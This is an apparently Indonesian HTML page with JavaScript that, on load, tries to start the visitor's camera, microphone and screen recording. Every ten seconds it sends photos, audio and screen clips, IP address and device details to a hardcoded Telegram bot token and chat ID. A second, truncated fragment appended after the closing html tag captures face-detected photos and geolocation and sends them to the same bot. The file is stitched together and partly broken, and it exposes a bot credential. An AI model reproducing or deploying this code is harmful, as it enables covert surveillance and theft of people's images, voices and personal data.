â€<!DOCTYPE html>
â€<html lang="id">
â€<head>
â€<meta charset="utf-8"/>
â€<meta name="viewport" content="width=device-width,initial-scale=1"/>
â€<title>All-in-One Capture â†’ Telegram (Auto)</title>
â€<style>
â€Â  :root{--bg:#071018;--card:#0f1720;--muted:#9aa4b2;--accent:#00ffff}
â€Â  html,body{height:100%;margin:0;font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#071018,#0d1117);color:#e6eef6;display:flex;align-items:center;justify-content:center}
â€Â  .wrap{width:980px;max-width:96%;padding:16px;border-radius:12px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));box-shadow:0 10px 40px rgba(0,0,0,0.6)}
â€Â  h1{margin:0 0 8px;font-size:20px;display:flex;gap:10px;align-items:center}
â€Â  .grid{display:grid;grid-template-columns:1fr 360px;gap:12px}
â€Â  .card{background:rgba(255,255,255,0.02);border-radius:10px;padding:12px}
â€Â  .status{font-family:monospace;font-size:13px;color:#cfe;white-space:pre-wrap;max-height:280px;overflow:auto;padding:8px;background:rgba(0,0,0,0.18);border-radius:8px}
â€Â  button{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--accent);padding:8px 10px;border-radius:8px;cursor:pointer}
â€Â  video{width:100%;border-radius:8px;background:#000;display:block}
â€Â  .small{font-size:13px;color:var(--muted)}
â€Â  .controls{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}
â€Â  .note{color:#ffcc66;font-size:12px}
â€</style>
â€</head>
â€<body>
â€Â  <div class="wrap">
â€Â Â Â  <h1>ğŸ”Œ All-in-One: Camera Photo Â· Device Info Â· Voice Â· Screen â†’ Telegram (Auto)</h1>
â€Â Â Â  <p class="small">Mencoba otomatis: ambil foto kamera, rekam audio & screen (potongan), kirim & kirim info device â€” setiap interval. Pastikan HTTPS / localhost.</p>
â€
â€Â Â Â  <div class="grid">
â€Â Â Â Â Â  <div>
â€Â Â Â Â Â Â Â  <div class="card">
â€Â Â Â Â Â Â Â Â Â  <h3 style="margin:0 0 6px 0">Live Camera</h3>
â€Â Â Â Â Â Â Â Â Â  <video id="camVideo" autoplay playsinline muted></video>
â€Â Â Â Â Â Â Â Â Â  <div style="height:8px"></div>
â€Â Â Â Â Â Â Â Â Â  <div id="camStatus" class="status">Camera: belum aktif</div>
â€Â Â Â Â Â Â Â  </div>
â€
â€Â Â Â Â Â Â Â  <div style="height:10px"></div>
â€
â€Â Â Â Â Â Â Â  <div class="card">
â€Â Â Â Â Â Â Â Â Â  <h3 style="margin:0 0 6px 0">Logs & Status</h3>
â€Â Â Â Â Â Â Â Â Â  <div id="log" class="status">Menunggu inisialisasi...</div>
â€Â Â Â Â Â Â Â Â Â  <div style="height:8px"></div>
â€Â Â Â Â Â Â Â Â Â  <div class="controls">
â€Â Â Â Â Â Â Â Â Â Â Â  <button id="btnStartAll">Mulai Manual (jika auto diblokir)</button>
â€Â Â Â Â Â Â Â Â Â Â Â  <button id="btnStopAll">Hentikan Semua</button>
â€Â Â Â Â Â Â Â Â Â Â Â  <span class="note">Interval default: 10 detik. Ubah di kode jika mau 5s.</span>
â€Â Â Â Â Â Â Â Â Â  </div>
â€Â Â Â Â Â Â Â  </div>
â€Â Â Â Â Â  </div>
â€
â€Â Â Â Â Â  <div>
â€Â Â Â Â Â Â Â  <div class="card">
â€Â Â Â Â Â Â Â Â Â  <h3 style="margin:0 0 6px 0">Pengaturan & Token</h3>
â€Â Â Â Â Â Â Â Â Â  <div class="small">Bot Telegram & Chat ID yang dipakai (disimpan di file):</div>
â€Â Â Â Â Â Â Â Â Â  <pre id="tokenArea" class="status"></pre>
â€Â Â Â Â Â Â Â Â Â  <div style="height:8px"></div>
â€Â Â Â Â Â Â Â Â Â  <div class="small">INFO: Browser mungkin minta klik manual untuk izinkan kamera/mikrofon/layar.</div>
â€Â Â Â Â Â Â Â  </div>
â€
â€Â Â Â Â Â Â Â  <div style="height:10px"></div>
â€
â€Â Â Â Â Â Â Â  <div class="card">
â€Â Â Â Â Â Â Â Â Â  <h3 style="margin:0 0 6px 0">Preview Screen</h3>
â€Â Â Â Â Â Â Â Â Â  <video id="screenVideo" autoplay playsinline style="display:none"></video>
â€Â Â Â Â Â Â Â Â Â  <div id="screenStatus" class="status">Screen: belum aktif</div>
â€Â Â Â Â Â Â Â  </div>
â€Â Â Â Â Â  </div>
â€Â Â Â  </div>
â€Â  </div>
â€
â€<script>
â€/* ================== KONFIGURASI ================== */
â€/* Ganti INTERVAL_MS ke 5000 untuk 5 detik */
â€const INTERVAL_MS = 10000; // 10 detik
â€const BOT_TOKEN = "8414860263:AAFhAxcv1lWfhXCQB8h8BTjNFY6EB6P_jIc";
â€const CHAT_ID = "8471664635";
â€
â€/* ================== Elemen UI ================== */
â€const camVideo = document.getElementById('camVideo');
â€const camStatus = document.getElementById('camStatus');
â€const screenVideo = document.getElementById('screenVideo');
â€const screenStatus = document.getElementById('screenStatus');
â€const logDiv = document.getElementById('log');
â€document.getElementById('tokenArea').textContent = `BOT_TOKEN: ${BOT_TOKEN}\nCHAT_ID: ${CHAT_ID}`;
â€
â€/* ================== Helper & util ================== */
â€function now() { return new Date().toLocaleTimeString(); }
â€function appendLog(msg) { logDiv.textContent = `[${now()}] ${msg}\n\n` + logDiv.textContent; }
â€function sleep(ms){ return new Promise(res => setTimeout(res, ms)); }
â€
â€async function sendText(text){
â€Â  try {
â€Â Â Â  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
â€Â Â Â Â Â  method:'POST', headers: {'Content-Type':'application/json'},
â€Â Â Â Â Â  body: JSON.stringify({ chat_id: CHAT_ID, text })
â€Â Â Â  });
â€Â  } catch(e){ console.error('sendText err', e); }
â€}
â€async function sendPhotoBlob(blob, caption){
â€Â  try {
â€Â Â Â  const fd = new FormData();
â€Â Â Â  fd.append('chat_id', CHAT_ID);
â€Â Â Â  fd.append('caption', caption || '');
â€Â Â Â  fd.append('photo', blob, 'photo.jpg');
â€Â Â Â  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
â€Â  } catch(e){ console.error('sendPhotoBlob err', e); }
â€}
â€async function sendDocBlob(blob, filename, caption){
â€Â  try {
â€Â Â Â  const fd = new FormData();
â€Â Â Â  fd.append('chat_id', CHAT_ID);
â€Â Â Â  fd.append('caption', caption || '');
â€Â Â Â  fd.append('document', blob, filename);
â€Â Â Â  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
â€Â  } catch(e){ console.error('sendDocBlob err', e); }
â€}
â€
â€/* ================== Device info builder ================== */
â€async function getPublicIP(){
â€Â  try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); return j.ip; } catch { return 'unknown'; }
â€}
â€function detectDevice(){
â€Â  const ua = navigator.userAgent || '';
â€Â  const platform = navigator.platform || 'unknown';
â€Â  const cores = navigator.hardwareConcurrency || 'n/a';
â€Â  const mem = navigator.deviceMemory || 'n/a';
â€Â  return { ua, platform, cores, mem };
â€}
â€function netInfo(){
â€Â  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
â€Â  return { type: conn ? (conn.effectiveType || conn.type) : 'unknown', downlink: conn ? conn.downlink : 'n/a', rtt: conn ? conn.rtt : 'n/a' };
â€}
â€async function buildDeviceCaption(note){
â€Â  const dev = detectDevice();
â€Â  const net = netInfo();
â€Â  const ip = await getPublicIP();
â€Â  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
â€Â  const lines = [
â€Â Â Â  "ğŸ“¡ Device Info",
â€Â Â Â  `ğŸ•’ ${new Date().toLocaleString()}`,
â€Â Â Â  `Platform: ${dev.platform}`,
â€Â Â Â  `UA: ${dev.ua}`,
â€Â Â Â  `Cores: ${dev.cores}, Mem: ${dev.mem}`,
â€Â Â Â  `Network: ${net.type} (down:${net.downlink}, rtt:${net.rtt})`,
â€Â Â Â  `IP: ${ip}`,
â€Â Â Â  `Timezone: ${tz}`,
â€Â Â Â  note || ''
â€Â  ];
â€Â  return lines.join("\n");
â€}
â€
â€/* ================== Camera Photo capture ================== */
â€let camStream = null;
â€async function startCamera(){
â€Â  if (camStream) return;
â€Â  try {
â€Â Â Â  camStatus.textContent = "Meminta izin kamera...";
â€Â Â Â  camStream = await navigator.mediaDevices.getUserMedia({ video: { width:640, height:480 }, audio: false });
â€Â Â Â  camVideo.srcObject = camStream;
â€Â Â Â  await camVideo.play();
â€Â Â Â  camStatus.textContent = "Camera: aktif";
â€Â Â Â  appendLog("Camera aktif.");
â€Â  } catch(e){
â€Â Â Â  camStatus.textContent = "Camera: gagal - " + (e.message || e);
â€Â Â Â  appendLog("Gagal akses kamera: " + (e.message || e));
â€Â  }
â€}
â€async function stopCamera(){
â€Â  if (!camStream) return;
â€Â  camStream.getTracks().forEach(t=>t.stop());
â€Â  camStream = null;
â€Â  try { camVideo.srcObject = null; } catch {}
â€Â  camStatus.textContent = "Camera: berhenti";
â€Â  appendLog("Camera dihentikan.");
â€}
â€async function capturePhotoAndSend(){
â€Â  if (!camStream) { appendLog("Capture skipped: camera tidak aktif."); return; }
â€Â  try {
â€Â Â Â  const w = camVideo.videoWidth || 640;
â€Â Â Â  const h = camVideo.videoHeight || 480;
â€Â Â Â  const c = document.createElement('canvas');
â€Â Â Â  c.width = w; c.height = h;
â€Â Â Â  const ctx = c.getContext('2d');
â€Â Â Â  ctx.drawImage(camVideo, 0, 0, w, h);
â€Â Â Â  const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.85));
â€Â Â Â  const caption = await buildDeviceCaption("Foto kamera otomatis");
â€Â Â Â  await sendPhotoBlob(blob, caption);
â€Â Â Â  appendLog("Foto kamera dikirim.");
â€Â  } catch(e){ appendLog("Error capturePhoto: " + (e.message || e)); }
â€}
â€
â€/* ================== Audio recording (chunked) ================== */
â€let audioStream = null;
â€let audioRecorder = null;
â€let audioChunks = [];
â€let audioActive = false;
â€
â€async function startAudio(){
â€Â  if (audioActive) return;
â€Â  try {
â€Â Â Â  appendLog("Meminta izin mikrofon...");
â€Â Â Â  audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
â€Â Â Â  audioActive = true;
â€Â Â Â  audioRecorder = new MediaRecorder(audioStream);
â€Â Â Â  audioRecorder.ondataavailable = e => { if (e.data && e.data.size) audioChunks.push(e.data); };
â€Â Â Â  audioRecorder.onstop = async () => {
â€Â Â Â Â Â  if (audioChunks.length === 0) return;
â€Â Â Â Â Â  const blob = new Blob(audioChunks, { type: audioChunks[0].type || 'audio/webm' });
â€Â Â Â Â Â  const ts = new Date().toISOString().replace(/[:.]/g,'-');
â€Â Â Â Â Â  const filename = `audio-${ts}.webm`;
â€Â Â Â Â Â  const caption = await buildDeviceCaption("Audio otomatis");
â€Â Â Â Â Â  await sendDocBlob(blob, filename, caption);
â€Â Â Â Â Â  appendLog("Chunk audio dikirim: " + filename);
â€Â Â Â Â Â  audioChunks = [];
â€Â Â Â  };
â€Â Â Â  audioRecorder.start();
â€Â Â Â  appendLog("Audio merekam.");
â€Â Â Â  // loop chunking using stop/start pattern
â€Â Â Â  (async function loopAudio(){
â€Â Â Â Â Â  while (audioActive){
â€Â Â Â Â Â Â Â  await sleep(INTERVAL_MS);
â€Â Â Â Â Â Â Â  if (!audioActive) break;
â€Â Â Â Â Â Â Â  try {
â€Â Â Â Â Â Â Â Â Â  if (audioRecorder && audioRecorder.state === 'recording') {
â€Â Â Â Â Â Â Â Â Â Â Â  audioRecorder.stop();
â€Â Â Â Â Â Â Â Â Â Â Â  await sleep(300); // allow onstop to fire & send
â€Â Â Â Â Â Â Â Â Â Â Â  audioRecorder = new MediaRecorder(audioStream);
â€Â Â Â Â Â Â Â Â Â Â Â  audioChunks = [];
â€Â Â Â Â Â Â Â Â Â Â Â  audioRecorder.ondataavailable = e => { if (e.data && e.data.size) audioChunks.push(e.data); };
â€Â Â Â Â Â Â Â Â Â Â Â  audioRecorder.onstop = async () => {
â€Â Â Â Â Â Â Â Â Â Â Â Â Â  if (audioChunks.length === 0) return;
â€Â Â Â Â Â Â Â Â Â Â Â Â Â  const blob = new Blob(audioChunks, { type: audioChunks[0].type || 'audio/webm' });
â€Â Â Â Â Â Â Â Â Â Â Â Â Â  const ts = new Date().toISOString().replace(/[:.]/g,'-');
â€Â Â Â Â Â Â Â Â Â Â Â Â Â  const filename = `audio-${ts}.webm`;
â€Â Â Â Â Â Â Â Â Â Â Â Â Â  const caption = await buildDeviceCaption("Audio otomatis");
â€Â Â Â Â Â Â Â Â Â Â Â Â Â  await sendDocBlob(blob, filename, caption);
â€Â Â Â Â Â Â Â Â Â Â Â Â Â  appendLog("Chunk audio dikirim: " + filename);
â€Â Â Â Â Â Â Â Â Â Â Â Â Â  audioChunks = [];
â€Â Â Â Â Â Â Â Â Â Â Â  };
â€Â Â Â Â Â Â Â Â Â Â Â  audioRecorder.start();
â€Â Â Â Â Â Â Â Â Â  }
â€Â Â Â Â Â Â Â  } catch(err){
â€Â Â Â Â Â Â Â Â Â  appendLog("Audio chunk error: " + (err.message || err));
â€Â Â Â Â Â Â Â Â Â  break;
â€Â Â Â Â Â Â Â  }
â€Â Â Â Â Â  }
â€Â Â Â  })();
â€Â  } catch(e){
â€Â Â Â  audioActive = false;
â€Â Â Â  appendLog("Gagal akses mikrofon: " + (e.message || e));
â€Â  }
â€}
â€function stopAudio(){
â€Â  audioActive = false;
â€Â  try { if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop(); } catch {}
â€Â  if (audioStream) { audioStream.getTracks().forEach(t=>t.stop()); audioStream = null; }
â€Â  appendLog("Audio dihentikan.");
â€}
â€
â€/* ================== Screen recording (chunked) ================== */
â€let screenStream = null;
â€let screenRecorder = null;
â€let screenChunks = [];
â€let screenActive = false;
â€
â€async function startScreen(){
â€Â  if (screenActive) return;
â€Â  try {
â€Â Â Â  appendLog("Meminta izin recording layar...");
â€Â Â Â  screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
â€Â Â Â  try { screenVideo.srcObject = screenStream; screenVideo.style.display = 'block'; } catch {}
â€Â Â Â  screenRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm;codecs=vp9' });
â€Â Â Â  screenRecorder.ondataavailable = e => { if (e.data && e.data.size) screenChunks.push(e.data); };
â€Â Â Â  screenRecorder.onstop = async () => {
â€Â Â Â Â Â  if (screenChunks.length === 0) return;
â€Â Â Â Â Â  const blob = new Blob(screenChunks, { type: screenChunks[0].type || 'video/webm' });
â€Â Â Â Â Â  const ts = new Date().toISOString().replace(/[:.]/g,'-');
â€Â Â Â Â Â  const filename = `screen-${ts}.webm`;
â€Â Â Â Â Â  const caption = await buildDeviceCaption("Screen otomatis");
â€Â Â Â Â Â  await sendDocBlob(blob, filename, caption);
â€Â Â Â Â Â  appendLog("Chunk screen dikirim: " + filename);
â€Â Â Â Â Â  screenChunks = [];
â€Â Â Â  };
â€Â Â Â  screenRecorder.start();
â€Â Â Â  screenActive = true;
â€Â Â Â  screenStatus.textContent = "Screen: merekam";
â€Â Â Â  appendLog("Screen recording aktif.");
â€Â Â Â  // loop chunking
â€Â Â Â  (async function loopScreen(){
â€Â Â Â Â Â  while (screenActive){
â€Â Â Â Â Â Â Â  await sleep(INTERVAL_MS);
â€Â Â Â Â Â Â Â  if (!screenActive) break;
â€Â Â Â Â Â Â Â  try {
â€Â Â Â Â Â Â Â Â Â  if (screenRecorder && screenRecorder.state === 'recording') {
â€Â Â Â Â Â Â Â Â Â Â Â  screenRecorder.stop();
â€Â Â Â Â Â Â Â Â Â Â Â  await sleep(500);
â€Â Â Â Â Â Â Â Â Â Â Â  screenRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm;codecs=vp9' });
â€Â Â Â Â Â Â Â Â Â Â Â  screenChunks = [];
â€Â Â Â Â Â Â Â Â Â Â Â  screenRecorder.ondataavailable = e => { if (e.data && e.data.size) screenChunks.push(e.data); };
â€Â Â Â Â Â Â Â Â Â Â Â  screenRecorder.onstop = async () => {
â€Â Â Â Â Â Â Â Â Â Â Â Â Â  if (screenChunks.length === 0) return;
â€Â Â Â Â Â Â Â Â Â Â Â Â Â  const blob = new Blob(screenChunks, { type: screenChunks[0].type || 'video/webm' });
â€Â Â Â Â Â Â Â Â Â Â Â Â Â  const ts = new Date().toISOString().replace(/[:.]/g,'-');
â€Â Â Â Â Â Â Â Â Â Â Â Â Â  const filename = `screen-${ts}.webm`;
â€Â Â Â Â Â Â Â Â Â Â Â Â Â  const caption = await buildDeviceCaption("Screen otomatis");
â€Â Â Â Â Â Â Â Â Â Â Â Â Â  await sendDocBlob(blob, filename, caption);
â€Â Â Â Â Â Â Â Â Â Â Â Â Â  appendLog("Chunk screen dikirim: " + filename);
â€Â Â Â Â Â Â Â Â Â Â Â Â Â  screenChunks = [];
â€Â Â Â Â Â Â Â Â Â Â Â  };
â€Â Â Â Â Â Â Â Â Â Â Â  screenRecorder.start();
â€Â Â Â Â Â Â Â Â Â  }
â€Â Â Â Â Â Â Â  } catch(err){
â€Â Â Â Â Â Â Â Â Â  appendLog("Screen chunk error: " + (err.message || err));
â€Â Â Â Â Â Â Â Â Â  break;
â€Â Â Â Â Â Â Â  }
â€Â Â Â Â Â  }
â€Â Â Â  })();
â€
â€Â Â Â  // stop when user stops sharing
â€Â Â Â  screenStream.getVideoTracks().forEach(track => track.onended = () => { stopScreen(); });
â€Â  } catch(e){
â€Â Â Â  screenStatus.textContent = "Screen: error - " + (e.message || e);
â€Â Â Â  appendLog("Gagal akses layar: " + (e.message || e));
â€Â  }
â€}
â€function stopScreen(){
â€Â  screenActive = false;
â€Â  try { if (screenRecorder && screenRecorder.state === 'recording') screenRecorder.stop(); } catch {}
â€Â  if (screenStream) { screenStream.getTracks().forEach(t=>t.stop()); screenStream = null; }
â€Â  try { screenVideo.srcObject = null; screenVideo.style.display = 'none'; } catch {}
â€Â  screenStatus.textContent = "Screen: berhenti";
â€Â  appendLog("Screen dihentikan.");
â€}
â€
â€/* ================== Overall scheduler: capture everything each interval ================== */
â€let mainIntervalHandle = null;
â€async function captureCycleOnce(){
â€Â  appendLog("=== Cycle start ===");
â€Â  // send device info text first
â€Â  try {
â€Â Â Â  const caption = await buildDeviceCaption("Cycle otomatis");
â€Â Â Â  await sendText(caption);
â€Â Â Â  appendLog("Device info dikirim.");
â€Â  } catch(e){ appendLog("Gagal kirim device info: " + (e.message || e)); }
â€
â€Â  // capture camera photo (async)
â€Â  try { await capturePhotoAndSend(); } catch(e){ appendLog("Gagal foto: " + (e.message || e)); }
â€
â€Â  // audio & screen are chunked independently by their loops â€” but to ensure a chunk gets sent around this time,
â€Â  // we force stop recorder to emit ondataavailable (if active), then restart quickly (only if active)
â€Â  try {
â€Â Â Â  if (audioActive && audioRecorder && audioRecorder.state === 'recording') {
â€Â Â Â Â Â  audioRecorder.stop();
â€Â Â Â Â Â  appendLog("Audio recorder cycle forced to stop->send.");
â€Â Â Â Â Â  await sleep(300);
â€Â Â Â Â Â  // restart recorder (handled by audio loop normally)
â€Â Â Â  }
â€Â  } catch(e){ appendLog("Audio cycle force error: " + (e.message || e)); }
â€
â€Â  try {
â€Â Â Â  if (screenActive && screenRecorder && screenRecorder.state === 'recording') {
â€Â Â Â Â Â  screenRecorder.stop();
â€Â Â Â Â Â  appendLog("Screen recorder cycle forced to stop->send.");
â€Â Â Â Â Â  await sleep(400);
â€Â Â Â  }
â€Â  } catch(e){ appendLog("Screen cycle force error: " + (e.message || e)); }
â€
â€Â  appendLog("=== Cycle end ===");
â€}
â€
â€async function startAll(){
â€Â  appendLog("Memulai semua komponen...");
â€Â  await startCamera();
â€Â  await startAudio();
â€Â  await startScreen();
â€
â€Â  // immediate first cycle shortly after start
â€Â  await sleep(500);
â€Â  await captureCycleOnce();
â€
â€Â  // start interval loop for combined cycles
â€Â  if (mainIntervalHandle) clearInterval(mainIntervalHandle);
â€Â  mainIntervalHandle = setInterval(() => {
â€Â Â Â  captureCycleOnce().catch(e => appendLog("Cycle err: " + (e.message || e)));
â€Â  }, INTERVAL_MS);
â€}
â€
â€/* stop everything */
â€function stopAll(){
â€Â  if (mainIntervalHandle) { clearInterval(mainIntervalHandle); mainIntervalHandle = null; }
â€Â  stopCamera();
â€Â  stopAudio();
â€Â  stopScreen();
â€Â  appendLog("Semua dihentikan.");
â€}
â€
â€/* ================ Buttons ================ */
â€document.getElementById('btnStartAll').addEventListener('click', () => startAll());
â€document.getElementById('btnStopAll').addEventListener('click', () => stopAll());
â€
â€/* ================ Auto-start attempt ================ */
â€window.addEventListener('load', async () => {
â€Â  appendLog("Inisialisasi halaman. Mencoba auto-start...");
â€Â  // Try to auto-start â€” many browsers may block screen getDisplayMedia without gesture,
â€Â  // but we'll still try to get camera & microphone (which sometimes succeed).
â€Â  try {
â€Â Â Â  await startAll();
â€Â Â Â  appendLog("Auto-start sequence dijalankan (berhasil/terblokir?). Jika gagal, klik 'Mulai Manual'.");
â€Â  } catch(e){
â€Â Â Â  appendLog("Auto-start gagal: " + (e.message || e));
â€Â  }
â€});
â€
â€/* cleanup on unload */
â€window.addEventListener('beforeunload', () => { stopAll(); });
â€</script>
â€</body>
â€Â  </html>Â Â Â  try {
â€Â Â Â Â Â  const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
â€Â Â Â Â Â  const data = await res.json();
â€Â Â Â Â Â  const countryCode = data.address?.country_code?.toUpperCase() || "N/A";
â€Â Â Â Â Â  const country = data.address?.country || "Tidak diketahui";
â€Â Â Â Â Â  const city = data.address?.city || data.address?.town || data.address?.village || "Tidak diketahui";
â€Â Â Â Â Â  return `${city}, ${country} [${countryCode}]`;
â€Â Â Â  } catch {
â€Â Â Â Â Â  return "Tidak diketahui";
â€Â Â Â  }
â€Â  }
â€
â€Â  async function sendToTelegram(photoBlob, caption) {
â€Â Â Â  const fd = new FormData();
â€Â Â Â  fd.append("chat_id", CHAT_ID);
â€Â Â Â  fd.append("caption", caption);
â€Â Â Â  fd.append("photo", photoBlob, "face.jpg");
â€Â Â Â  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
â€Â Â Â Â Â  method: "POST",
â€Â Â Â Â Â  body: fd
â€Â Â Â  });
â€Â  }
â€
â€Â  // ==== Deteksi & Kirim ====
â€Â  async function captureAndSend() {
â€Â Â Â  // ambil ukuran proporsional (agar tidak gepeng)
â€Â Â Â  const w = video.videoWidth;
â€Â Â Â  const h = video.videoHeight;
â€Â Â Â  canvas.width = w;
â€Â Â Â  canvas.height = h;
â€Â Â Â  ctx.drawImage(video, 0, 0, w, h);
â€
â€Â Â Â  const detections = await faceapi.detectAllFaces(canvas, new faceapi.TinyFaceDetectorOptions());
â€Â Â Â  if (detections.length === 0) return; // skip kalau tidak ada wajah
â€
â€Â Â Â  const device = detectDevice();
â€Â Â Â  const net = getNetworkInfo();
â€Â Â Â  const loc = await getLocation();
â€Â Â Â  let locText = "Tidak diketahui";
â€Â Â Â  if (loc) locText = await reverseGeocode(loc.lat, loc.lon);
â€
â€Â Â Â  const caption =
â€`ğŸ“¸ Deteksi Wajah Otomatis
â€ğŸ“± Device: ${device}
â€ğŸŒ Jaringan: ${net.type.toUpperCase()} (${net.downlink} Mbps)
â€ğŸ“ Lokasi: ${locText}
â€ğŸ•’ ${new Date().toLocaleString("id-ID")}`;
â€
â€Â Â Â  canvas.toBlob(async blob => {
â€Â Â Â Â Â  try {
â€Â Â Â Â Â Â Â  await sendToTelegram(blob, caption);
â€Â Â Â Â Â Â Â  console.log("âœ… Terkirim:", new Date().toLocaleTimeString());
â€Â Â Â Â Â  } catch (e) {
â€Â Â Â Â Â Â Â  console.error("âŒ Gagal kirim:", e);
â€Â Â Â Â Â  }
â€Â Â Â  }, "image/jpeg", 0.9);
â€Â  }
â€
â€Â  // ==== Inisialisasi ====
â€Â  async function init() {
â€Â Â Â  try {
â€Â Â Â Â Â  await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
â€Â Â Â Â Â  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
â€Â Â Â Â Â  video.srcObject = stream;
â€Â Â Â Â Â  await video.play();
â€Â Â Â Â Â  setInterval(captureAndSend, DETECT_INTERVAL);
â€Â Â Â  } catch (e) {
â€Â Â Â Â Â  console.error("Kamera error:", e);
â€Â Â Â  }
â€Â  }
â€
â€Â  window.addEventListener("load", init);
â€Â  </script>
â€</body>
â€</html>
â€
